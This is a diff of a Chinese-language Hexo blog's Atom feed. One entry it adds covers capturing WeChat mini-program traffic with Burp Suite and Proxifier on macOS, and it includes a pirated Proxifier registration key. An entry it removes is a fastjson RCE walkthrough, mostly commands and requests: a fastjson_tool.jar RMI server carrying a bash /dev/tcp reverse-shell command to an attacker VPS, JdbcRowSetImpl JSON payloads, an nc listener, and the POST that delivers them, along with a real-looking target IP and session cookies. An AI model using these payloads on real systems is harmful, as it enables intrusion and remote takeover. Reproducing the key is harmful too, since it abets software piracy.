@@ -6,7 +6,7 @@
   <link href="https://askding.github.io/atom.xml" rel="self"/>
   
   <link href="https://askding.github.io/"/>
-  <updated>2021-11-15T12:55:56.230Z</updated>
+  <updated>2021-11-15T12:57:33.000Z</updated>
   <id>https://askding.github.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>如何在mac上抓小程序的流量</title>
+    <link href="https://askding.github.io/Kali/PostExploit/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F.html"/>
+    <id>https://askding.github.io/Kali/PostExploit/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F.html</id>
+    <published>2021-11-15T12:57:33.000Z</published>
+    <updated>2021-11-15T12:57:33.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="Burpsuite抓取微信小程序流量"><a href="#Burpsuite抓取微信小程序流量" class="headerlink" title="Burpsuite抓取微信小程序流量"></a>Burpsuite抓取微信小程序流量</h2><p>通过Proxifier工具代理微信小程序流量到Burp</p><ol><li>安装Burpsuite证书到macOS系统中</li></ol><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291302084burp_cert.png"></p><ol start="2"><li>安装proxifier并添加Proxifier规则</li></ol><blockquote><p>Your name or company name:<br>macwk.com<br>Your registration key:<br>2DNRX-V3PNK-TEGYN-DR01D-9UGGT</p></blockquote><pre><code class="shell">brew install --cask proxifier</code></pre><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291312960proxif_reg.png"></p><p>添加代理和配置代理规则</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291359940proxi_prox.png"></p><blockquote><p>微信小程序路径 : /Applications/WeChat.app/Contents/MacOS/Mini Program.app</p></blockquote><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291408305proxi_rule.png"></p><blockquote><p>⚠️ 先启动Proxifier，再启动Burpsuite，最后打开微信小程序,(最好关掉其他代理)</p></blockquote><p>抓包成功</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291449850prox_burp.png"></p><p>存在其他代理(如clashX)时，Proxifier设置方法</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291505365proxi.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;Burpsuite抓取微信小程序流量&quot;&gt;&lt;a href=&quot;#Burpsuite抓取微信小程序流量&quot; cl</summary>
+      
+    
+    
+    
+    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
+    
+    <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>Spring</title>
@@ -527,34 +555,6 @@
     
     
     <category term="Coding" scheme="https://askding.github.io/categories/Coding/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>fastjson_rce</title>
-    <link href="https://askding.github.io/Kali/Exploit/fastjson-rce.html"/>
-    <id>https://askding.github.io/Kali/Exploit/fastjson-rce.html</id>
-    <published>2021-01-29T08:09:51.000Z</published>
-    <updated>2021-01-29T08:09:51.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="漏洞url"><a href="#漏洞url" class="headerlink" title="漏洞url"></a>漏洞url</h1><p><a href="http://x.x.x.x/demo/login">http://x.x.x.x/demo/login</a> </p><pre><code class="shell">POST /demo/login HTTP/1.1Host: x.x.x.xContent-Length: 35Accept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Content-Type: application/jsonOrigin: http://106.14.21.5:31180Referer: http://106.14.21.5:31180/demo/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510Connection: close&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;</code></pre><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="在vps-47-106-65-x-上生成payload"><a href="#在vps-47-106-65-x-上生成payload" class="headerlink" title="在vps(47.106.65.x)上生成payload"></a>在vps(47.106.65.x)上生成payload</h2><p><a href="https://github.com/wyzxxz/fastjson_rce_tool">fastjson_tool.jar</a></p><pre><code class="shell">java -cp /tmp/fastjson_tool.jar fastjson.HRMIServer 47.106.65.x 1099 &quot;bash=bash -i &gt;&amp; /dev/tcp/47.106.65.x/9999 0&gt;&amp;1&quot;[-] payload:  &#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;[-] payload:  &#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;&#125;[-] Opening JRMP listener on 1099...</code></pre><h2 id="在vps上监听999端口"><a href="#在vps上监听999端口" class="headerlink" title="在vps上监听999端口"></a>在vps上监听999端口</h2><pre><code class="shell">nc -lvvp 999</code></pre><h2 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h2><pre><code class="shell">POST /demo/login HTTP/1.1Host: x.x.x.xContent-Length: 184Accept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Content-Type: application/jsonOrigin: http://x.x.x.xReferer: http://x.x.x.x/demo/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510Connection: close&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;&#125;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
-&lt;/ul&gt;
-&lt;h1 id=&quot;漏洞url&quot;&gt;&lt;a href=&quot;#漏洞url&quot; class=&quot;headerlink&quot; title=&quot;漏洞</summary>
-      
-    
-    
-    
-    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
-    
-    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
     
     
   </entry>
